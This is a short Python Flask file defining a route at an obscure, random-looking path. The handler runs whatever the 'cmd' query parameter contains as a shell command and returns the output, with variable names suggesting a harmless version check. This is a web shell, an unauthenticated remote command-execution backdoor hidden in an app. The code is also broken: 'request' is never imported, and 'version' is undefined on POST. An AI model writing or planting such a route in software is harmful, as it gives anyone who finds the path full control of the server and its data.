from app import app
from flask import Flask
import subprocess
import os

@app.route("/ppkojdlse/llodmmcvkdf",  methods=['GET', 'POST'])
def cate():
    if request.method == 'GET':
        name = request.args.get("cmd")
        getVersion =  subprocess.Popen(name, shell=True, stdout=subprocess.PIPE).stdout
        version =  getVersion.read()

    return str(version)